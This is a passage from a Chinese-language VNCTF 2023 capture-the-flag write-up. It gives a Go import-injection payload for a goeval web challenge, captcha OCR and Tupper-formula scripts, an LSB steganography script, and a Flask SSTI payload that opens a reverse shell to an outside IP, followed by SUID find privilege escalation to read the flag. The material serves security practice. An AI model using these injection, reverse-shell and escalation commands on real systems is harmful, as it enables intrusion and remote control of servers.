err := goeval.Eval(&quot;&quot;, &quot;fmt.Println(\&quot;Good\&quot;)&quot;, c.DefaultQuery(&quot;pkg&quot;, &quot;fmt&quot;))</code>，在这里可控参数只有第三个选项的<code>pkg</code>，这就涉及一个goeval的逃逸了，可以看看Eval的源码：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Eval</span><span class="params">(defineCode <span class="type">string</span>, code <span class="type">string</span>, imports ...<span class="type">string</span>)</span></span> (re []<span class="type">byte</span>, err <span class="type">error</span>) &#123;</span><br><span class="line"> <span class="keyword">var</span> (</span><br><span class="line">  tmp = <span class="string">`package main</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">func main() &#123;</span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line">  importStr <span class="type">string</span></span><br><span class="line">  fullCode <span class="type">string</span></span><br><span class="line">   newTmpDir = tempDir + dirSeparator + RandString(<span class="number">8</span>)</span><br><span class="line"> )</span><br><span class="line"> <span class="keyword">if</span> <span class="number">0</span> &lt; <span class="built_in">len</span>(imports) &#123;</span><br><span class="line">  importStr = <span class="string">&quot;import (&quot;</span></span><br><span class="line">  <span class="keyword">for</span> _, item := <span class="keyword">range</span> imports &#123;</span><br><span class="line">   <span class="keyword">if</span> blankInd := strings.Index(item, <span class="string">&quot; &quot;</span>); <span class="number">-1</span> &lt; blankInd &#123;</span><br><span class="line">    importStr += fmt.Sprintf(<span class="string">&quot;n %s &quot;</span>%s<span class="string">&quot;&quot;</span>, item[:blankInd], item[blankInd+<span class="number">1</span>:])</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    importStr += fmt.Sprintf(<span class="string">&quot;n&quot;</span>%s<span class="string">&quot;&quot;</span>, item)</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  importStr += <span class="string">&quot;n)&quot;</span></span><br><span class="line"> &#125;</span><br><span class="line"> fullCode = fmt.Sprintf(tmp, importStr, defineCode, code)</span><br><span class="line"></span><br><span class="line"> <span class="keyword">var</span> codeBytes = []<span class="type">byte</span>(fullCode)</span><br><span class="line"> <span class="comment">// 格式化输出的代码</span></span><br><span class="line"> <span class="keyword">if</span> formatCode, err := format.Source(codeBytes); <span class="literal">nil</span> == err &#123;</span><br><span class="line">  <span class="comment">// 格式化失败，就还是用 content 吧</span></span><br><span class="line">  codeBytes = formatCode</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">// fmt.Println(string(codeBytes))</span></span><br><span class="line"> <span class="comment">// 创建目录</span></span><br><span class="line"> <span class="keyword">if</span> err = os.Mkdir(newTmpDir, os.ModePerm); <span class="literal">nil</span> != err &#123;</span><br><span class="line">  <span class="keyword">return</span></span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">defer</span> os.RemoveAll(newTmpDir)</span><br><span class="line"> <span class="comment">// 创建文件</span></span><br><span class="line"> tmpFile, err := os.Create(newTmpDir + dirSeparator + <span class="string">&quot;main.go&quot;</span>)</span><br><span class="line"> <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> re, err</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">defer</span> os.Remove(tmpFile.Name())</span><br><span class="line"> <span class="comment">// 代码写入文件</span></span><br><span class="line"> tmpFile.Write(codeBytes)</span><br><span class="line"> tmpFile.Close()</span><br><span class="line"> <span class="comment">// 运行代码</span></span><br><span class="line"> cmd := exec.Command(<span class="string">&quot;go&quot;</span>, <span class="string">&quot;run&quot;</span>, tmpFile.Name())</span><br><span class="line"> res, err := cmd.CombinedOutput()</span><br><span class="line"> <span class="keyword">return</span> res, err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这里我们可控参数对应的就是第二占位符，并且可以发现它是通过字符串拼贴得出的<code>importSt</code>，因此这里就可以通过闭合import，达到逃逸的目的<br>由于是在main函数外，所以得通过<code>func init()</code>方法去优先于main执行命令，也是由于在main方法外，不可以存在<code>()</code>这样的单一结构，会报错，因此最后一个<code>)</code>，需要通过<code>const ( boogipop=&quot;testpop&quot;</code>进行闭合，因此我们的payload为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pkg=os/exec&quot;%0a&quot;fmt&quot;)%0afunc%09init()\&#123;%0acmd%09:=exec.Command(&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;cat$&#123;IFS&#125;/f*&quot;)%0ares,err%09:=%09cmd.CombinedOutput()%0afmt.Println(string(res))%0afmt.Println(err)%0a&#125;%0aconst(%0aMessage=&quot;fmt</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676774477554-e5663731-72e6-40fd-a73d-5c6ab67a5b13.png#averageHue=%23aaadaa&clientId=u40879044-74e5-4&from=paste&height=534&id=u1e86f8e9&name=image.png&originHeight=668&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=205856&status=done&style=none&taskId=u36ca4ac3-d473-450e-b2f2-1b630e408d5&title=&width=1536" alt="image.png"></p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h3><p>不给提示还真不知道，一给提示就通了<br>给了136个图片，全是纯数字验证码，并且提示给了<code>tupper</code><br>首先通过py脚本识别验证码，将其拼贴在一起：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ddddocr</span><br><span class="line"></span><br><span class="line">ocr = ddddocr.DdddOcr()</span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">136</span>):</span><br><span class="line">    <span class="built_in">dir</span>=<span class="string">&quot;C:\\Users\\22927\\Downloads\\imgs\\&quot;</span></span><br><span class="line">    filename=<span class="built_in">dir</span>+<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>.png&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        img_bytes = f.read()</span><br><span class="line">        res+= ocr.classification(img_bytes)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="comment">#1594199391770250354455183081054802631580554590456781276981302978243348088576774816981145460077422136047780972200375212293357383685099969525103172039042888918139627966684645793042724447954308373948403404873262837470923601139156304668538304057819343713500158029312192443296076902692735780417298059011568971988619463802818660736654049870484193411780158317168232187100668526865378478661078082009408188033574841574337151898932291631715135266804518790328831268881702387643369637508117317249879868707531954723945940226278368605203277838681081840279552</span></span><br></pre></td></tr></table></figure>
<p>这里脚本出来的结果中0识别为了o，需要手动改改，不太麻烦<br>tupper可以联想到塔帕自指公式，用脚本跑出来</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> textwrap</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">K =<span class="string">&#x27;上面注释的数字，放进来导不出来&#x27;</span></span><br><span class="line">H = <span class="number">17</span></span><br><span class="line">W = <span class="number">106</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    plt.figure(figsize=(<span class="number">6.8</span>, <span class="number">4</span>), dpi=<span class="number">600</span>)</span><br><span class="line">    plt.axis(<span class="string">&quot;scaled&quot;</span>)</span><br><span class="line"></span><br><span class="line">    K_ = K//<span class="number">17</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(W):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(H):</span><br><span class="line">            <span class="keyword">if</span> K_ &amp; <span class="number">1</span>:</span><br><span class="line">                plt.bar(x+<span class="number">0.5</span>, bottom=y, height=<span class="number">1</span>,</span><br><span class="line">                        width=<span class="number">1</span>, linewidth=<span class="number">0</span>, color=<span class="string">&quot;black&quot;</span>)</span><br><span class="line">            K_ &gt;&gt;= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    plt.figtext(<span class="number">0.5</span>, <span class="number">0.8</span>, <span class="string">r&quot;$\frac&#123;1&#125;&#123;2&#125;&lt;\left\lfloor \operatorname&#123;mod&#125;\left(\left\lfloor\frac&#123;y&#125;&#123;%d&#125;\right\rfloor 2^&#123;-%d\lfloor x\rfloor-\operatorname&#123;mod&#125;(\lfloor y\rfloor, %d)&#125;, 2\right)\right\rfloor$&quot;</span> % (H, H, H), ha=<span class="string">&quot;center&quot;</span>, va=<span class="string">&quot;bottom&quot;</span>, fontsize=<span class="number">18</span>)</span><br><span class="line">    plt.subplots_adjust(top=<span class="number">0.8</span>, bottom=<span class="number">0.5</span>)</span><br><span class="line">    K_str = textwrap.wrap(<span class="built_in">str</span>(K), <span class="number">68</span>)</span><br><span class="line">    K_str[<span class="number">0</span>] = <span class="string">f&quot;K=<span class="subst">&#123;K_str[<span class="number">0</span>]&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(K_str)):</span><br><span class="line">        K_str[i] = <span class="string">f&quot;  <span class="subst">&#123;K_str[i]&#125;</span>&quot;</span>.ljust(<span class="number">70</span>)</span><br><span class="line">    K_str = <span class="string">&quot;\n&quot;</span>.join(K_str)</span><br><span class="line">    plt.figtext(<span class="number">0.5</span>, <span class="number">0.45</span>, K_str, fontfamily=<span class="string">&quot;monospace&quot;</span>, ha=<span class="string">&quot;center&quot;</span>, va=<span class="string">&quot;top&quot;</span>)</span><br><span class="line"></span><br><span class="line">    plt.xlim((<span class="number">0</span>, W))</span><br><span class="line">    plt.ylim((<span class="number">0</span>, H))</span><br><span class="line">    xticks = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">0</span>, W+<span class="number">1</span>))</span><br><span class="line">    xlabels = [<span class="string">&quot;&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> xticks]</span><br><span class="line">    xlabels[<span class="number">0</span>] = <span class="string">&quot;0&quot;</span></span><br><span class="line">    xlabels[-<span class="number">1</span>] = <span class="built_in">str</span>(W)</span><br><span class="line">    plt.xticks(xticks, xlabels)</span><br><span class="line">    yticks = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">0</span>, H+<span class="number">1</span>))</span><br><span class="line">    ylabels = [<span class="string">&quot;&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> yticks]</span><br><span class="line">    ylabels[<span class="number">0</span>] = <span class="string">&quot;K&quot;</span></span><br><span class="line">    ylabels[-<span class="number">1</span>] = <span class="string">f&quot;K+<span class="subst">&#123;H&#125;</span>&quot;</span></span><br><span class="line">    plt.yticks(yticks, ylabels)</span><br><span class="line">    plt.grid(b=<span class="literal">True</span>, linewidth=<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># plt.show()</span></span><br><span class="line">    plt.savefig(<span class="string">&quot;Tupper-plot.png&quot;</span>)</span><br><span class="line">    <span class="comment"># plt.savefig(fname=&quot;name&quot;, format=&quot;svg&quot;)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>运行得出flag图片：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676774850465-dbf0f179-475d-4b9d-abf9-cc23a1039ade.png#averageHue=%23e0e0e0&clientId=u40879044-74e5-4&from=paste&height=617&id=u92f7d668&name=image.png&originHeight=771&originWidth=1487&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=184899&status=done&style=none&taskId=u48069616-5b7e-4ecf-9b22-1197d4878fd&title=&width=1189.6" alt="image.png"><br><code>flag&#123;MISC_COOL!!&#125;</code></p>
<h3 id="LSSTIB"><a href="#LSSTIB" class="headerlink" title="LSSTIB"></a>LSSTIB</h3><p>其实这一题放到Web不是更好吗()<br>披了一层皮的SSTI注入，但是有些地方要注意，首先网站架构为Flask，对应python版本为<code>3.8</code>，是python3的话你假如用py2的lsb脚本加密可能就寄了（<strong>好像其实就是lsb加密的问题？之前用py2有密码，只需要改一下lsb.py变为无加密即可QWQ</strong>)<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676775012581-156c4f29-d77a-416a-bf45-88c27624f340.png#averageHue=%23fefdfd&clientId=u40879044-74e5-4&from=paste&height=120&id=u69b69be2&name=image.png&originHeight=150&originWidth=1192&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=12641&status=done&style=none&taskId=ue0102a2c-4340-4ff7-a332-3174f9dbc9e&title=&width=953.6" alt="image.png"><br>因此我去网上找了个PY3的LSB加密脚本:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># PIL,Python Imaging Library.图像处理功能</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">plus</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">  <span class="comment"># Python zfill() 方法返回指定长度的字符串，原字符串右对齐，前面填充0。</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">str</span>.zfill(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_key</span>(<span class="params">strr</span>):</span><br><span class="line">  <span class="comment"># 获取要隐藏的文件内容</span></span><br><span class="line"></span><br><span class="line">  tmp = strr</span><br><span class="line"></span><br><span class="line">  f = <span class="built_in">open</span>(tmp, <span class="string">&quot;rb&quot;</span>)  <span class="comment"># 要读取二进制文件，比如图片、视频等等，用&#x27;rb&#x27;模式打开文件</span></span><br><span class="line"></span><br><span class="line">  s = f.read()</span><br><span class="line">  <span class="built_in">str</span> = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    <span class="comment"># 逐个字节将要隐藏的文件内容转换为二进制，并拼接起来</span></span><br><span class="line">    <span class="comment"># 1.使用bin()函数将十进制的ascii码转换为二进制</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2.由于bin()函数转换二进制后，二进制字符串的前面会有&quot;0b&quot;来表示这个字符串是二进制形式，所以用replace()替换为空</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3.又由于这样替换之后是七位，而正常情况下每个字符由8位二进制组成，所以使用自定义函数plus将其填充为8位</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">str</span> = <span class="built_in">str</span> + plus(<span class="built_in">bin</span>(s[i]).replace(<span class="string">&#x27;0b&#x27;</span>, <span class="string">&#x27;&#x27;</span>))  <span class="comment"># s[i]为该位置字符的十进制表示的ascll码</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print str</span></span><br><span class="line"></span><br><span class="line">  f.closed</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mod</span>(<span class="params">x, y</span>):</span><br><span class="line">  <span class="keyword">return</span> x % y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># str1为载体图片路径，str2为隐写文件，str3为加密图片保存的路径</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">str1, str2, str3</span>):</span><br><span class="line">  im = Image.<span class="built_in">open</span>(str1)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># 获取图片的宽和高</span></span><br><span class="line"></span><br><span class="line">  width = im.size[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;width:&quot;</span> + <span class="built_in">str</span>(width) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">  height = im.size[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;height:&quot;</span> + <span class="built_in">str</span>(height) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">  count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 获取需要隐藏的信息</span></span><br><span class="line"></span><br><span class="line">  key = get_key(str2)</span><br><span class="line"></span><br><span class="line">  keylen = <span class="built_in">len</span>(key)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, height):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, width):</span><br><span class="line"></span><br><span class="line">      pixel = im.getpixel((w, h))  <span class="comment"># 返回该像素点三原色的二进制信息，形成一个数组</span></span><br><span class="line"></span><br><span class="line">      a = pixel[<span class="number">0</span>]  <span class="comment"># R</span></span><br><span class="line"></span><br><span class="line">      b = pixel[<span class="number">1</span>]  <span class="comment"># G</span></span><br><span class="line"></span><br><span class="line">      c = pixel[<span class="number">2</span>]  <span class="comment"># B</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> count == keylen:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">      <span class="comment"># 下面的操作是将信息隐藏进去</span></span><br><span class="line"></span><br><span class="line">      <span class="comment"># 分别将每个像素点的RGB值余2，这样可以去掉最低位的值</span></span><br><span class="line"></span><br><span class="line">      <span class="comment"># 再从需要隐藏的信息中取出一位，转换为整型</span></span><br><span class="line"></span><br><span class="line">      <span class="comment"># 两值相加，就把信息隐藏起来了</span></span><br><span class="line"></span><br><span class="line">      a = a - mod(a, <span class="number">2</span>) + <span class="built_in">int</span>(key[count])</span><br><span class="line"></span><br><span class="line">      count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> count == keylen:</span><br><span class="line">        im.putpixel((w, h), (a, b, c))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">      b = b - mod(b, <span class="number">2</span>) + <span class="built_in">int</span>(key[count])</span><br><span class="line"></span><br><span class="line">      count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> count == keylen:</span><br><span class="line">        im.putpixel((w, h), (a, b, c))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">      c = c - mod(c, <span class="number">2</span>) + <span class="built_in">int</span>(key[count])</span><br><span class="line"></span><br><span class="line">      count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> count == keylen:</span><br><span class="line">        im.putpixel((w, h), (a, b, c))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> count % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">        im.putpixel((w, h), (a, b, c))</span><br><span class="line"></span><br><span class="line">  im.save(str3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 原图</span></span><br><span class="line"></span><br><span class="line">old = <span class="string">r&quot;E:\CtfTool\babygo_vnctf2023\3.png&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理后输出的图片路径</span></span><br><span class="line"></span><br><span class="line">new = <span class="string">r&quot;E:\CtfTool\babygo_vnctf2023\4.png&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 需要隐藏的信息</span></span><br><span class="line"></span><br><span class="line">enc = <span class="string">r&quot;E:\CtfTool\babygo_vnctf2023\1.log&quot;</span></span><br><span class="line"></span><br><span class="line">func(old, enc, new)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>网站标题为<code>加密日志上传</code>，因此解码出来的文件应该是.log文件，内容为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__.os.popen(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/114.116.119.253/7788 &lt;&amp;1&quot;&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>上传可以看到：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676775153251-e4644aa8-c2ff-4eba-9cd8-bcf320758c45.png#averageHue=%23dbd5d0&clientId=u40879044-74e5-4&from=paste&height=687&id=u989de816&name=image.png&originHeight=859&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=309489&status=done&style=none&taskId=ua79e0d76-d2b2-4e45-83bf-7377ea16f4c&title=&width=1536" alt="image.png"><br>这里其实已经弹shell了（我在这没接收），vps上开启监听即可获得反弹shell：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676775221216-4f11dbbc-9301-4661-8b17-c740f0c712d8.png#averageHue=%23100f0e&clientId=u40879044-74e5-4&from=paste&height=438&id=uf2e19552&name=image.png&originHeight=547&originWidth=1135&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=50033&status=done&style=none&taskId=ua4b723ad-a987-490d-837f-b1da80f392c&title=&width=908" alt="image.png"><br>但是flag文件没有权限读取，所以需要简单提权，寻找一下suid命令：<br><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676775391739-f985d77a-de17-4b8b-bbcd-ecc48f665a62.png#averageHue=%23050303&clientId=u30d260dd-dbaf-4&from=paste&height=247&id=ua19d799e&name=image.png&originHeight=309&originWidth=982&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=20611&status=done&style=none&taskId=ub0edfc87-63eb-443e-8a52-01584040d7e&title=&width=785.6" alt="image.png"><br>这里后半部分的<code>/usr/bin</code>出来的及其慢，需要耐心等待（一开始没做出来也是因为这个）<br>看到了find还有啥好说的：<br><code>touch /tmp/evilboogipop&amp;&amp;find /tmp/evilboogipop -exec whoami \;</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676775818861-f371e8d0-cfb7-4cbf-9ac3-8ee9c2ff9aab.png#averageHue=%23100e0d&clientId=u30d260dd-dbaf-4&from=paste&height=103&id=u9ff1fa51&name=image.png&originHeight=129&originWidth=915&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=9196&status=done&style=none&taskId=u7c6d4eeb-0c53-4245-9c03-596c2816002&title=&width=732" alt="image.png"><br><code>touch /tmp/evilboogipop&amp;&amp;find /tmp/evilboogipop -exec cat /flag \;</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676775840317-76152a31-4b7c-45cc-8e34-2ddc4b8f2770.png#averageHue=%23110e0d&clientId=u30d260dd-dbaf-4&from=paste&height=78&id=u7d238c30&name=image.png&originHeight=97&originWidth=1035&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=10580&status=done&style=none&taskId=u2f200b9e-538c-49a8-b48c-0265bcdf77d&title=&width=828" alt="image.png"></p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/WriteUp/" class="tag">#WriteUp</a><a href="/tags/VNCTF/" class="tag">#VNCTF</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/04/02/%E6%84%9A%E4%BA%BA%E6%9D%AF3rd%20%5Beasy_php%5D/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">愚人杯3rd [easy_php]</h3>
                </div>
            </div>
        </a>
        
        
